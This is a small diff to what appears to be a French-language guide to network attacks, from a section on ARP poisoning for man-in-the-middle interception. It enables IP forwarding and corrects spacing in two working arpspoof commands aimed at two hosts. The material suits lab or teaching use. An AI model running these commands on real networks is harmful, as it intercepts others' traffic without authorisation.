@@ -793,9 +793,9 @@ sudo sysctl -w net.ipv4.ip_forward=1
 ### 2. Empoisonnement ARP (MITM)
 
 
-sudo arpspoof-i eth0 -t192.31.25.15 192.31.25.12
+sudo arpspoof-i eth0 -t 192.31.25.15 192.31.25.12
 
-sudo arpspoof-i eth0 -t192.31.25.12 192.31.25.15
+sudo arpspoof-i eth0 -t 192.31.25.12 192.31.25.15
 
 
 ---
